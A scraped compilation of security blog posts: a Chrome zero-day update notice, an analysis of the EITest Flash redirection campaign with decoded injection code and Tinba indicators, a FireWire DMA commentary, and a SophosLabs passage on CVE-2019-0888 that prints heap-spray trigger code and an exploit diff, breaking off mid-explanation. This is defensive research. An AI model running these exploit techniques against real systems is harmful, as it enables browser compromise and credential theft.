Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Google Chrome zero-day: Now is the time to update and restart your browser
Update (2019-03-21)
A proof of concept for CVE-2019-5786 was published by Exodus Intel. In our earlier post we exercised caution before claiming we would have blocked this zero-day, but we can now say with confidence that an older version of Malwarebytes (1.12.1.122) would have mitigated this attack:",0.010873121225911664
"This shows the benefits for certain applications from being allowed to inject into Chrome, something that Google’s new policies have disabled.
—
It’s not often that we hear about a critical vulnerability in Google Chrome, and perhaps it’s even more rare when Google’s own engineers are urging users to patch.
There are several good reasons why you need to take this new Chrome zero-day (CVE-2019-5786) seriously. For starters, we are talking about a full exploitation that escapes the sandbox and leads to remote code execution. This in itself is not an easy feat, and is usually observed only sporadically, perhaps during a Pwn2Own competition. But this time, Google is saying that this vulnerability is actively being used in the wild.
According to Clément Lecigne, the person from Google’s Threat Analysis Group who discovered the attack, there is another zero-day that exists in Microsoft Windows (yet to be patched), suggesting the two could be chained up for even greater damage.
Proof of concept for CVE-2019-5786
If you are running Google Chrome and its version is below 72.0.3626.121, your computer could be exploited without your knowledge. While it’s true that Chrome features an automatic update component, in order for the patch to be installed you must restart your browser.
This may not seem like a big deal but it is. Another Google engineer explains why this matters a lot, in comparison to past exploits:",0.008099065083415624
"This newest exploit is different, in that initial chain targeted Chrome code directly, and thus required the user to have restarted the browser after the update was downloaded. For most users the update download is automatic, but restart is a usually a manual action. [3/3]
— Justin Schuh 🗑 (@justinschuh) March 7, 2019",0.00991245526084883
"Considering how many users keep Chrome and all their tabs opened for days or even weeks without ever restarting the browser, the security impact is real.
Some might see a bit of irony with this latest zero-day considering Google’s move to ban third-party software injections. Many security programs, including Malwarebytes, need to hook into processes, such as the browser and common Office applications, in order to detect and block exploits from happening. However, we cannot say for sure whether or not this could prevent the vulnerability from being exploited, since few details have been shared yet.
In the meantime, if you haven’t done so yet, you should update and relaunch Chrome; and don’t worry about your tabs, they will come right back.
",0.01163942890096914
"Exposing the Flash ‘EITest’ malware campaign
Security incidents seldom are unrelated. Connecting those dots can help us better understand the underlying architecture and groups involved in cyber-crime.
Since early July, we have been tracking a malware campaign that leverages legitimate websites, DNS records and exploit kit operators.
This mechanism in itself is not something new since the majority of drive-by downloads are the result of malicious redirections from legitimate sites and rotating URLs used as the doorway to exploit kit landing pages.
But this particular instance is unique in how it cleverly uses the same Flash-based redirection script which also allows us to tie similar website compromises together.
In this post we will show how this campaign works and provide indicators of compromise for website owners who may be affected.
Overview",0.011609525228555295
Hacked websites,0.008286382843751494
"Thousands of websites have been hacked and are performing malicious redirections, unbeknownst to their owners. Here are some examples:
hxxp://a7lasura.com/
hxxp://alfajrhajj.com/
hxxp://allforkids.tv/
hxxp://www.aguisa.fr/
hxxp://www.angelforum.at/
hxxp://www.kasianova.pl/
hxxp://www.krawallbrueder.com/
hxxp://www.moviemug.com/
hxxp://www.panelreklamowy.pl/
hxxp://www.peoplesoftonline.com/
hxxp://www.stat.cmu.edu/
hxxp://www.tattoosleeveideas.net/
hxxp://www.televisiontunes.com/
hxxp://www.utanpotlassport.hu/
hxxp://www.valentiaisland.ie/
hxxp://www.venafro.info/
hxxp://www.videoklipove.com/
...
The Department of Statistics at Carnegie Mellon University (www.stat.cmu.edu) happens to be one of them.
To illustrate this campaign, we will study this particular one in great details.",0.01261428703598988
"Using the free website scanner from Sucuri, we noticed that the server was running an outdated version of Apache (2.2.15) which has several vulnerabilities.
We also noticed the site was built on the Drupal Content Management System (CMS) which recently suffered a serious SQL injection vulnerability already exploited in the wild.
Of course there can be other factors that lead a website to getting hacked, such as: poor passwords, insecure file permissions, etc.
Not having access to the website itself, we can only see the outward-facing symptoms, which in this case is a malicious piece of code inserted at the very bottom of the main page’s source code, and happens to be the signature of this particular operation:",0.010409540322181554
"This is simply code for a Flash application that is embedded within the page with certain parameters to make it invisible to the naked eye. The ‘name’ variable, “EITest”, appears to be used statically across all compromised sites.
That code is very noisy (a single line iframe would have sufficed) and should be easily spotted based on its constant format and placement.
However, it is only injected once per visit of the site (IP address logging). If you revisit the page again you get this (notice the blank line space between the script and body tags where the code was once injected):",0.01150799278425374
"This could make it tricky for a website owner to identify since their own IP address would most likely already have been flagged.
Subdomains and DNS magic",0.00869066299188459
The one part that interests us (and that is the reason it raised a flag) is the source URL for that Flash application. It is a subdomain on .us.to,0.008438378742935515
"In fact, that URL is dynamic and changes very frequently. Here’s a shortlist of a few we have documented:
hxxp://pole.us.to/
hxxp://popo.us.to/
hxxp://pops.us.to/
hxxp://pum.us.to/
hxxp://retr.us.to/
hxxp://server71.us.to/
hxxp://sflv.us.to/
hxxp://site7.us.to/
hxxp://tda.us.to/
hxxp://tubes.us.to/
hxxp://uilo.us.to/
hxxp://ulmi.us.to/
...
So what exactly is us.to ? It is a URL shortener:",0.013676642210242784
which used the tonic Domain Name Registry:,0.007475827126583678
and the free DNS service operated by afraid.org.,0.01432433654744647
"There have been many malware reports involving afraid.org and just like what other free DNS services, the bad guys often (ab)use them. Such services allow anyone to register subdomains and therefore build a large pool of URLs that can be used and discarded easily.
Interestingly, in a recent post the SWITCH Security Blog outlines the problem: “the default, free, setting when you register a domain is public” and “creating a sub domain pointing to something totally unrelated is easy”.
Image courtesy of Robtex
us.to is among the most popular domains with 131,167 hosts:",0.010989564398071971
"It is worth noting that uk.to (maybe a distant cousin) is also listed here and digging in our logs we observed similar malicious activity on this domain from March 2014 to early July 2014, which is when we started to detect bad activity on us.to.",0.014650251686823323
"For the record, there are other domains that are being abused in this campaign. Many have exotic Top Level Domain names (.ml, .ga, etc)
The malicious subdomain (hite.us.to) resides on 148.251.56.156, an IP address located in Germany on the 24940 Autonomous System (Hetzner Online AG).",0.01552790627595968
VirusTotal also gives you the daily changes on that IP if you check their report here.,0.017096421980459353
"Malicious Flash file
The rogue piece of code embedded in all of the hacked websites is similar and points to a Flash file (MD5: f738a21fb3f8314bab49cbf4c57ac1fe).  To figure out its modus operandi, we need to analyse it either dynamically or statically.
Unfortunately, the dynamics analysis failed to provide any concrete results so we opted out for a static analysis instead.
Loading the Flash file in Adobe’s SWF Investigator shows a few interesting bits, such as a call to ExternalInterface used to execute JavaScript code into the page where the Flash file is loaded:",0.013502770594920999
But overall the file remains a bit of a mystery mainly because it is quite obfuscated and difficult to read. The next step will consist of decompiling the SWF into pure Action Script code which we can play with:,0.014103650511040566
The last part of this Action Script code is quite obfuscated:,0.008093806507195156
"The FlashVars variables css and id (from the original embedded code in the CMU site) are passed to the ActionScript code.
<param name=""FlashVars"" value=""css=2&id=iqnt0wu0vq1xkfgq0rjrAkf%3F6864D8CF%3A7D34%3A259ED632C556%3A255442%3BD93ED%3BG%3AH88F59634476%3B46CD89GHE%3A9%3A57E"" />
First we need to figure out the decryption routine (special thanks to Jerome Dangu of ClarityAd for the help) as shown below, so we can finally see the purpose of that file.
var arg1=""gxcn""; var loc1=""""; var loc2=0; var m=2; while (loc2 < arg1.length) { loc1 = loc1 + String.fromCharCode(arg1.charCodeAt(loc2) - m); ++loc2; } console.log(loc1);
Now we can decode the rest of the script (shown in green):
var arg1:String =”tgvwtp\”pcxkicvqt0wugtCigpv=”; // return navigator userAgent;
var arg1:String =”oukg”; // msie
var arg1:String =”tx<33″; // rv :ll
var arg1:String =”qrgtc”; // opera
var arg1:String=”ugvVkogqwv*hwpevkqp*+}xct\”f\”?\”fqewogpv0etgcvgGngogpv*)fkx)+=f0kf?)eqwpvgtaxcnwg)=f0uv{ng0rqukvkqp\”?\”)cduqnwvg)=f0uv{ng0nghv\”?\”)922rz)=f0uv{ng0vqr\”?\”)/3222rz)=f0kppgtJVON\”?\”)>khtcog\”ute?$jvvr<11″; // setTimeout (function () {var d = document.creatElement (‘div’); id = ‘counter_value’; d.style.position = ‘absolute’; d.style.left = ‘700px’; d.style.top = ‘-1000px’; d.innerHTML = ‘
var arg1:String=”gxcn”; //  eval
var arg1:String=”$@>1khtcog@)=fqewogpv0dqf{0crrgpfEjknf*f+= .77+=”; // “></iframe>’; document.body.appendChild(d);}, 55);
As you can see the bad guys went through a lot of work to simply hide an iframe. Add the fact that the ActionScript code was compiled into a SWF and you get why Flash files are the perfect ‘Trojan Horse’: a nice animation of the outside and a nasty payload on the inside.
This intermediary Flash file also acts as a filter to redirect traffic based on certain criteria (i.e. the victim’s browser). This is something we have been seeing more and more in recent attacks, especially with the Angler Exploit Kit.
In this case there were actually two possible scenarios once the iframe URL hit the target. You were either silently redirected to an adult site or an exploit page.
Adult site:",0.013713255295009108
"To be clear, the adult page is not shown while browsing the University site. Rather it is silently side-loaded, perhaps in an attempt to generate artificial traffic.",0.012831741488952053
"Exploitation (Angler EK)
After having visited the Department of Statistics at Carnegie Mellon’s website and being served the rogue Flash code, a piece of JavaScript (window.self.location.replace) loaded an exploit kit landing page.
The landing page launches an Internet Explorer exploit (CVE-2014-1776) which immediately downloads a malicious binary. A Flash exploit is also fired but the infection has already happened.",0.009607465642666235
"Those exploit kit landing pages (Angler Exploit Kit) keep on changing. Here are some examples:
hxxp://qwe.surenesspresocratic.biz/zma97e66dd
hxxp://two.cretlakiplas.in/5uf4zk6zne
hxxp://one.drevlakyepa.in/i691h4uc7e
hxxp://two.vregkialo.asia/cixjwz4v6h
hxxp://one.lavioplaty.asia/nbi78z5ejd
hxxp://asd.calorimetrydanceorchestra.biz/i3eovtoenu
hxxp://qwe.drippingsoffal.biz/e4f92n296p
...
The following screenshot shows a Fiddler capture and summarizes the redirection flow.",0.011326866132593927
"Malware payload (Tinba)
During that campaign we observed various payloads but for simplicity’s sake we will focus on the payload we received when visiting the Carnegie Mellon site. It is part of the Tinba stealer family and its goal is to hook itself into the user’s system (and in particular the browser) to steal personal information such as banking credentials.",0.011305399431648877
"MD5: 5808cc73c78263a8114eb205f510f6a7
Upon execution, it launches a new process called winver.exe (a legitimate Windows file), injects it:",0.009902260393825801
and creates a copy of itself into %AppData%:,0.007216679992625985
It also achieves persistance by creating an entry under the Run Key:,0.006414688735575713
"Finally, the Trojan attempts to connect back to its command and control server (C&C) by querying various domains (using a Domain Generation Algorithm) until it finds a working one:
pqrronhyvuhc.ru
loobydkkkdkk.ru
yyxxgtwdoedk.ru
vuttxypyqnos.ru
fpoxmjgrrixs.ru
kjdeuqjyryyy.ru
yydebipcrbpx.ru
viqypwwxsbgd.ru
hiyymnrbueug.ru
mxmmlqpqrjbj.ru -> OK -> 185.22.233.103
The C&C, whose IP is located in Moscow, Russia, receives the data that was exfiltrated from the infected computer.",0.015900255373924588
"Conclusion
To summarize this campaign, here are some of the common elements:",0.01366839608930992
"Legitimate websites that have been compromised with the same embedded Flash code
Constantly changing URLs using randomly generated subdomains are used to host a Flash application
Traffic filtering using the same ActionScript code base allows the bad guys full control
Conditional redirections to (also rotating) Angler Exploit Kit landing pages deliver the final payload",0.011182191892885163
"The website injections can be be easily spotted at the bottom of the html source code. If you are a website owner and you have discovered this script, please ensure to look for other signs of infections on your server. The code in itself represents the symptoms, but the real culprit often is a backdoor (malicious shell or other php code) that allows the bad guys access and the ability to refresh the malicious URLs. A full audit of your site, including patches for outdated CMS software and plugins is a must.
The use (and abuse) of free subdomains is rather problematic because short of playing the whack-a-mole game, the easiest solution would be to block entire ranges that may contain legitimate sites.
Flash applications are proving to be the tool of choice for cyber-criminals lately and unlike Java, whose browser plugin can be disabled without too many consequences, removing Flash will result in a seriously degraded browsing experience. The best course of action is to keep the Flash Player up-to-date but that still won’t prevent JavaScript from running in your browser.
Some people will recommend using NoScript or similar tools to better control what gets executed. While its effectiveness does not need to be proven, it remains a painful solution for any serious surfing.
There is no question that every time we browse the Internet we are subjected to dozens of malicious redirections that could end very badly.
Malwarebytes Anti-Exploit mitigates this problem by detecting malicious behaviours in the browser or its plugins so that you can surf in peace, even in the (not recommended) event that your computer is not up-to-date.
While we can hope web site owners will keep their sites patched and secure, third-party content (scripts, advertising) is often a source of infections as well. For this reason, the old saying “security starts with you” still holds true.
@jeromesegura
",0.012339220191138311
"Where there’s smoke, there’s FireWire
Forensic software developer PassWare announced a new version of its eponymous software forensics kit on Tuesday. Already several news sources are writing about how the program can automatically obtain the login password from a locked or sleeping Mac simply by plugging in a USB flash drive containing their software and connecting it to another computer",0.011362278551297234
28 Jul 2011 - 11:19AM,0.011456482758616215
Forensic software developer PassWare announced a new version of its eponymous software forensics kit on Tuesday. Already several news sources are writing about how the program can automatically obtain the login password from a locked or sleeping Mac simply by plugging in a USB flash drive containing their software and connecting it to another computer,0.012723544867565661
"Forensic software developer PassWare announced a new version of its eponymous software forensics kit on Tuesday. Already several news sources are writing about how the program can automatically obtain the login password from a locked or sleeping Mac simply by plugging in a USB flash drive containing their software and connecting it to another computer via the FireWire  port.  FireWire, (also called i.LINK by SONY and known by the name of its standard, IEEE-1394) is, for those unfamiliar with it, a peripheral connection standard similar to USB.  Arguably superior, the higher cost and complexity of implementation has restricted it largely to professional use, such as digital media recording and editing, while USB has gone on to become the more popular interface for connecting peripheral devices.",0.01354013336219173
"First off, a little background:  One of the design features of FireWire, and part of what makes it attractive for professional use, is that it allows for DMA (Direct Memory Access), a technology used in modern computers which allows peripherals to bypass the CPU and directly read from and write to memory.  Because the  processor does not have to manage the data transfer, higher data rates and lower CPU utilization can be ensured, while leaving the CPU available to perform other functions.",0.011292343994119491
"While this form of password theft sounds novel enough to have been picked up by several news sources, notably MSNBC and PC World, is it really something new, or the return of something old?",0.013226763956572518
"In 2004, computer security researcher Maximilian Dornseif presented at the PacSec conference on how the FireWire interface on computers could allow access to a computer’s memory.  PacSec organizer Dragos Ruiu wrote an advisory on the BugTraq mailing list about the vulnerability as well.  The MITRE Corporation think tank, operator of the Common Vulnerabilities and Exposures (CVE) list, assigned this FireWire design error the rather pedestrian ID of CVE-2004-1038: this had gone largely unnoticed and uncommented upon until 2008, when it reared its head again incorporated into an authentication bypass attack on Windows XP and (with some modification) the then-new Windows Vista operating system.  In February, 2011, FireWire appeared in passing once more, this time in a malware attack scenario:  Ars Technica reported that computer security firm HBGary partnered with defense contractor General Dynamics on a project named “Task B” to install rootkits onto computers by writing them directly into a computer’s memory.",0.008814834656495685
"In all these cases, over the past seven years, one constant stands out time and time again:  In order for any of these attacks to succeed, the attacker needs physical access to the machine in order to plug a device in via the FireWire port.  If an attacker has physical access to a computer, though, they can do anything they want, including steal it.",0.015219020551520024
"For both Mac OS X and Windows, the solution to this “vulnerability” is quite simple (strictly speaking, it’s no more a vulnerability than the ability to boot a system from a recovery CD, for example):  If your computer is going to be unattended for any length of time in an insecure environment, turn it off and/or turn off automatic login (that way, the password isn’t there in memory to steal). You could also disable FireWire/1394 if you have no devices that use the port (not all systems have a FireWire port, of course). Or, even more simply, don’t leave your computer alone in an unsafe location.  While the chance of a password theft or rootkit injection via FireWire is likely quite low, there’s a much higher probability of its being stolen the old-fashioned way.",0.014092896854973058
"Aryeh Goretsky, MVP, ZCSE
Distinguished Researcher
",0.009562063253802378
CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO),0.012896121464683663
Details of the vulnerability we reported to Microsoft and was fixed in last month's Patch Tuesday,0.009865917374260569
"Written by
SophosLabs Offensive Security",0.008622298185940958
"July 09, 2019",0.008479977773543701
SophosLabs Uncut ADO CVE-2019-0888 Exploit use-after-free VBscript vulnerability Windows,0.005852105108370975
"The SophosLabs Offensive Security Research team discovered a security vulnerability in the ActiveX Data Objects (ADO) component of Windows. Microsoft resolved the issue in the June 2019 edition of Patch Tuesday. It has been a month since the patch was released, so we’ve decided to publish the following explanation of the bug, and how to exploit it to achieve an ASLR bypass and Read/Write primitive.
The article references symbols and types from the 32-bit vbscript.dll file, version 5.812.10240.16384, from Windows 10.
Background
ADO is an API to access and manipulate data through an OLE database provider. In our examples to follow, the OLE DB provider is a Microsoft SQL server. Different programs, using a variety of languages, can use this API.
In the scope of this article, we will make use of ADO from VBScript code running in Internet Explorer, and connect to a Microsoft SQL Server 2014 Express instance running locally.",0.011200559929514964
Here’s an example of a basic VBScript script that establishes a connection to the local database (named SQLEXPRESS) by using an ADO Recordset object:,0.011483579956045875
On Error Resume Next,0.009422705291062483
"Set RS = CreateObject(""ADOR.Recordset"")",0.01776592553440004
"RS.Open ""SELECT * FROM INFORMATION_SCHEMA.COLUMNS"", _
""Provider=SQLOLEDB;"" &amp; _
""Data Source=.\SQLEXPRESS;"" &amp; _
""Initial Catalog=master;"" &amp; _
""Integrated Security=SSPI;"" &amp; _
""Trusted_Connection=True;""",0.017632716747904453
"If Err.Number <&gt; 0 Then
MsgBox(""DB open error"")
Else
MsgBox(""DB opened"")
End If",0.021420499902824464
"Establishing a connection using ADO from Internet Explorer prompts this security warning, which makes the bug inconvenient to exploit unobtrusively.",0.009912497713254531
"The Bug
The Recordset Object method NextRecordset improperly handles its RecordsAffected parameter.
When an application calls this method with an Object-typed variable passed to it as the RecordsAffected parameter, the method will leave that object’s reference count decreased by 1, while keeping the variable referenceable.
When the reference count drops to 0, the operating system destroys the object and deallocates its memory. However, since the object can still be referenced by its variable name, further usage of that variable will cause a Use-After-Free condition.
These are the important bits about NextRecordset‘s functionality from its documentation:",0.010977579428640971
"Use the NextRecordset method to return the results of the next command in a compound command statement or of a stored procedure that returns multiple results.
The NextRecordset method is not available on a disconnected Recordset object.
Parameters: RecordsAffectedOptional. A Long variable to which the provider returns the number of records that the current operation affected.",0.009197302949729758
"Simply put, the method works on a connected Recordset object, retrieves and returns some sort of database related data, and writes back a number to the provided parameter.",0.013092331091361764
The method is implemented in library msado15.dll with the function CRecordset::NextRecordset. This is how NextRecordset is defined in the library’s COM interface:,0.011050671793046196
"If the method is successful at retrieving the database-related data, it calls the internal function ProcessRecordsAffected to handle the assignment of the number of affected records to parameter RecordsAffected.
Inside ProcessRecordsAffected, the library creates a local variable, called local_copy_of_RecordsAffected , shallow-copies the RecordsAffected parameter into it, and then calls the VariantClear function:",0.013625254501592576
"VariantClear is described here. To quote:
“The function clears a VARIANTARG by setting the vt field to VT_EMPTY.““The current contents of the VARIANTARG are released first. […] If the vt field is VT_DISPATCH, the object is released.”
VBScript object variables are, essentially, wrapped ActiveX objects, implemented in C++. They are created by the function CreateObject, e.g. variable RS in the above code sample.
VBScript objects are represented internally as Variant structures of the type VT_DISPATCH. Therefore, in this case, the call to VariantClear will set local_copy_of_RecordsAffected‘s type to VT_EMPTY, and perform a “release” on it, meaning it will invoke its underlying C++ object’s ::Release method, which decrements the object’s reference count by 1 (and destroys the object if the reference count reaches 0).
After the VariantClear call, the function continues as follows:",0.01558296899874001
"This function converts the 64-bit integer variable, RecordsAffectedNum,  into a signed 32-bit integer (referred to here as type VT_I4), and passes that value to VariantChangeType in an attempt to convert it to a variant of type RecordsAffected_vt, which is VT_DISPATCH in the vulnerable scenario.
No logic exists to convert a VT_I4 type into a VT_DISPATCH type, so VariantChangeType will always fail here, and the early return path will take place. Since RecordsAffected is defined with the out attribute in its COM interface declaration, the way ProcessRecordsAffected handles RecordsAffected will have an impact on the program:
“The [out] attribute indicates that a parameter that acts as a pointer and its associated data in memory are to be passed back from the called procedure to the calling procedure.“
Simply put, RecordsAffected is passed back to the program after NextRecordset returns, either in its original state or whatever state it was modified into by ProcessRecordsAffected. Looking back at the execution path the function undergoes in a vulnerable scenario, we can see it reaches the return statement without ever directly modifying RecordsAffected.
VariantClear is called on a copy of RecordsAffected, so it triggers a release of the copy’s underlying C++ object, and changes the copy’s type to VT_EMPTY.
Since the copying was done in a shallow way, both RecordsAffected and its copy contain the same pointer to the underlying C++ object; A release of one of the variables is equivalent to a release of the second. However, changing the copy’s type to VT_EMPTY will have no effect on RecordsAffected – its type will remain intact.
Since RecordsAffected‘s type has not been emptied, it will be passed back to the program and remain referenceable, despite its underlying C++ object being released and, potentially, deallocated.
Considering how the bug is seemingly triggered on every call to the method, how does it manage to complete a legitimate call without crashing?
Looking back at the documentation, it specifies that RecordsAffected is supposed to be of type Long (a variant of type VT_I4). VariantClear does not have the same destructive effect on VT_I4 variants as it does on VT_DISPATCH variants (releasing its object). Therefore, as long as calls to the method use a RecordsAffected that fits the intended type, there will be no negative side effects to the program.
Fix
The bug was fixed in Microsoft’s June 2019 edition of Patch Tuesday, and was assigned CVE-2019-0888.
The function ProcessRecordsAffected was patched to omit the local variable local_copy_of_RecordsAffected, instead operating directly on RecordsAffected, correctly emptying its type and preventing it from being passed back to the program.",0.014956533827781504
"“Dumb” Exploitation
The simplest way to achieve some type of exploit primitive with this bug would be to cause an object to be freed, and then immediately spray the heap with controlled-data memory allocations of the same size as the freed object, so that the memory that used to hold the object now holds our own arbitrary data.",0.01156746819894583
On Error Resume Next,0.009422705291062483
"Set RS = CreateObject(""ADOR.Recordset"")
Set freed_object = CreateObject(""ADOR.Recordset"")",0.01854889396404169
"' Open Recordset connection to database
RS.Open ""SELECT * FROM INFORMATION_SCHEMA.COLUMNS"", _
""Provider=SQLOLEDB;"" &amp; _
""Data Source=.\SQLEXPRESS;"" &amp; _
""Initial Catalog=master;"" &amp; _
""Integrated Security=SSPI;"" &amp; _
""Trusted_Connection=True;""",0.016334150564355276
"' Connection objects to be used for heap spray later
Dim array(1000)
For i = 0 To 1000
Set array(i) = CreateObject(""ADODB.Connection"")
Next",0.018638643492129847
"' Data to spray in heap: allocation size will be 0x418
' (size of CRecordset in 32-bit msado15.dll)
spray = ChrW(&amp;h4141) &amp; ChrW(&amp;h4141) &amp; _
ChrW(&amp;h4141) &amp; ChrW(&amp;h4141) &amp; _
Space(519)",0.017884517166448788
"' Trigger bug
Set Var1 = RS.NextRecordset(freed_object)",0.018315274299416595
"' Perform heap spray
For i = 0 To 1000
array(i).ConnectionString = spray
Next",0.014552336265073684
"' Trigger use after free
freed_object.Clone()",0.013803245365589967
"Line 4 creates a new VBScript object freed_object, with an underlying C++ object of type CRecordset, a 0x418-byte-sized structure.
Line 27 decreases freed_object‘s underlying C++ object’s reference count to 0, and should cause the deallocation of its internal resources.
Line 31 uses the ConnectionString property of the ADODB.Connection class to spray the heap. When a string is assigned into ConnectionString it creates a local copy, allocating a memory chunk with the same size as the assigned string, and copying its contents into it. The spray string is crafted to result in a 0x418-byte allocation.
Line 35 dereferences freed_object. At this point, any referencing of this variable will invoke a dynamic dispatch on the underlying C++ object, meaning its virtual table pointer will be dereferenced, and a function pointer will be loaded from that memory. Since the virtual table pointer is located at offset 0 of a C++ object, the value that will be loaded, and later cause a memory access violation exception in the first 4 bytes of spray, 0x41414141.
To make this primitive useful for actual exploitation, we would need to rely on knowing a readable, controllable memory address in the program’s address space – a feat that is rendered impossible by ASLR. A better approach will have to be used to defeat mitigations like ASLR to exploit this bug on modern systems.
Advanced Exploitation
While looking for existing research on exploitation methods for similar VBScript bugs that can be of help here, we came across CVE-2018-8174. Dubbed the “Double Kill” exploit, it was detected in the wild by security company Qihoo 360 around May 2018. Plenty of articles have been written about dissecting the captured exploit and underlying bug, so for further details we will refer to these:
[1] Analysis of CVE-2018-8174 VBScript 0day, 360 Qihoo
[2] Delving deep into VBScript: Analysis of CVE-2018-8174 exploitation, Kaspersky Lab
[3] Dissecting modern browser exploit: case study of CVE-2018–8174, piotrflorczyk
CVE-2018-8174 is a use-after-free bug in VBScript around the handling of the Class_Terminate callback function. Essentially, it gave the ability to arbitrarily free a VBScript object but keep it referenceable, similar to the ADO bug’s properties.
The captured exploit implemented a sophisticated technique that employs a type confusion attack to turn the use-after-free capability into an ASLR bypass and read-write-everywhere primitive. The technique itself isn’t useful on its own (without a bug to enable it), and is technically not a bug, so it was never “fixed,” and remains present in the code base. The technique is probably best explained in the article by Piotr Florczyk.
Given the similarities between the 2 bugs, it should be possible to take the commented exploit code for CVE-2018-8174 from Florczyk’s writeup, replace the bug-specific code parts to make use of the ADO bug, and have it successfully work the same way. And, indeed, applying this simple patch…",0.014357127313554874
"diff --git a/analysis_base.vbs b/analysis_modified.vbs
index 6c1cd3f..fd25809 100644
--- a/analysis_base.vbs
+++ b/analysis_modified.vbs
@@ -1,3 +1,14 @@
+Dim RS(13)
+For i = 0 to UBound(RS)
+    Set RS(i) = CreateObject(""ADOR.Recordset"")
+    RS(i).Open ""SELECT * FROM INFORMATION_SCHEMA.COLUMNS"", _
+        ""Provider=SQLOLEDB;"" &amp; _
+        ""Data Source=.\SQLEXPRESS;"" &amp; _
+        ""Initial Catalog=master;"" &amp; _
+        ""Integrated Security=SSPI;"" &amp; _
+        ""Trusted_Connection=True;""
+Next
+
Dim FreedObjectArray
Dim UafArrayA(6),UafArrayB(6)
Dim UafCounter
@@ -101,7 +112,8 @@ Public Default Property Get Q
Dim objectImitatingArray
Q=CDbl(""174088534690791e-324"") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
For idx=0 To 6
-        UafArrayA(idx)=0
+        On Error Resume Next
+        Set m = RS(idx).NextRecordset(resueObjectA_arr)
Next
Set objectImitatingArray=New FakeReuseClass
objectImitatingArray.mem = FakeArrayString
@@ -116,7 +128,8 @@ Public Default Property Get P
Dim objectImitatingInteger
P=CDbl(""636598737289582e-328"") ' db 0, 0, 0, 0, 3, 0, 0, 0
For idx=0 To 6
-        UafArrayB(idx)=0
+        On Error Resume Next
+        Set m = RS(7+idx).NextRecordset(resueObjectB_int)
Next
Set objectImitatingInteger=New FakeReuseClass
objectImitatingInteger.mem=Empty16BString
@@ -136,19 +149,7 @@ Sub UafTrigger
For idx=20 To 38
Set objectArray(idx)=New ReuseClass
Next
-    UafCounter=0
-    For idx=0 To 6
-        ReDim FreedObjectArray(1)
-        Set FreedObjectArray(1)=New ClassTerminateA
-        Erase FreedObjectArray
-    Next
Set resueObjectA_arr=New ReuseClass
-    UafCounter=0
-    For idx=0 To 6
-        ReDim FreedObjectArray(1)
-        Set FreedObjectArray(1)=New ClassTerminateB
-        Erase FreedObjectArray
-    Next
Set resueObjectB_int=New ReuseClass
End Sub",0.014690986280729179
"…produces a working exploit for the ADO bug.
It turns out that this exploit works on systems running Windows 7, but not on Windows 8 or later versions. This is the case with the original captured exploit as well. The exploit breaks due to “Low fragmentation heap (LFH) allocation order randomization”, a security measure for the heap introduced in Windows 8 that breaks simple use-after-free exploitation scenarios.
Bypassing LFH Allocation Order Randomization
Here’s one example of how heap behavior changed after Microsoft introduced LFH allocation order randomization:",0.011650343127059704
"Introducing allocation order randomization changed the outcome of malloc->free->malloc execution, from following a LIFO (Last In First Out) logic to being non-deterministic.
Why does this break the exploit? Consider the following excerpt from the commented exploit code:",0.012854825074554599
"Class ReplacingClass_Array
Public Default Property Get Q
...
For idx=0 To 6
On Error Resume Next
Set m = RS(idx).NextRecordset(reuseObjectA_arr)
Next
Set objectImitatingArray=New FakeReuseClass
...",0.01354711732557523
"In VBScript, all custom class objects are internally represented by the VBScriptClass C++ class. VBScript calls the function VBScriptClass::Create  when it executes a custom class object instantiation statement (for example, line 8). It makes a 0x44-byte-sized allocation to hold the VBScriptClass object.
When control reaches line 8, the For loop has just finished destroying reuseObjectA_arr, which is an instance of custom class ReuseClass. This will cause the VBScriptClass destructor to be called, freeing the 0x44 bytes that had been previously allocated. Line 8 then goes on to create a new object, objectImitatingArray, of a different custom class: FakeReuseClass.
The basis for a successful run of the type confusion attack is the assumption that objectImitatingArray will be assigned the same heap memory resources as the just-freed reuseObjectA_arr. However as noted before, with allocation order randomization enabled, you can’t make this assumption; the randomized heap breaks the exploit.
As a result of the type confusion attack, a memory corruption occurs. The heap allocation where corruption occurs is not the top-level (0x44) allocation of VBScriptClass itself, but a certain 0x108 bytes sized sub-allocation tied to it, used to store the object’s methods and variables. The function responsible for this sub-allocation is NameList::FCreateVval and is called shortly after the creation of a VBScriptClass (see article [2]).
To be more specific about the condition that needs to be met, the type confusion will work if, after the destruction of reuseObjectA_arr, a new VBScript object receives the same address for its 0x108 allocation as the one reuseObjectA_arr previously held. Other allocations tied to the two objects, including the 0x44 sized top-level allocation, don’t necessarily have to get matching addresses.
The specifics of the memory corruption part of the technique is not very straightforward to understand and it’s advised to read the Kaspersky background article to get a better understanding of it, but here’s the gist of it.
ReuseClass‘s method, SetProp, has the following statement: mem=Value. Value is an object variable, so its Default Property Getter will have to be invoked before the assignment can be completed.
The VBScript engine (vbscript.dll) calls internal function AssignVar to perform an assignment of this kind. This is a simplified pseudo-code to explain how it works:",0.018861023219109097
"AssignVar(VARIANT *destinationObject, char *destinationVariableName, VARIANT *source) {
// here, destinationObject is a ReuseClass instance, destinationVariableName is ""mem"", source is <Value&gt;",0.018214879734842593
"// get the address of object <destinationObject&gt;'s member variable with the name <destinationVariableName&gt;.
VARIANT *destinationPointer = CScriptRuntime::GetVarAdr(destinationObject, destinationVariableName);",0.012281649582060572
"// if the given source is an object, call the object's
// default property getter to get the actual source value
if (source-&gt;vt == VT_IDISPATCH) {
VARIANT *sourceValue = VAR::InvokeByDispID(source);
}",0.017579511294675276
"// perform the assignment
*destinationPointer = *sourceValue;
}",0.012949617251571732
"The function VAR::InvokeByDispID invokes the source object’s default property getter, allowing us to run arbitrary VBScript code in the midst of AssignVar‘s execution. If we use that space to trigger the destruction and replacement in memory of destinationObject (using the bug), we can take advantage of AssignVar proceeding to perform the assignment into destinationPointer (line 14) without realizing the memory it points to could have been tampered with.
The memory address being written into is the value returned by CScriptRuntime::GetVarAdr, which is a pointer to somewhere inside the given object’s 0x108 allocation. Its exact offset into the allocation depends on the given object’s class definition – particularly, how long the names of its methods and fields are.
ReuseClass and FakeReuseClass‘s definitions are arranged in a way to force a different offset for common member variable mem. Doing this, we’re forcing the final assignment to corrupt an object’s mem variable’s header in order to turn it into an Array type whose base pointer is NULL and its length is 0x7fffffff.
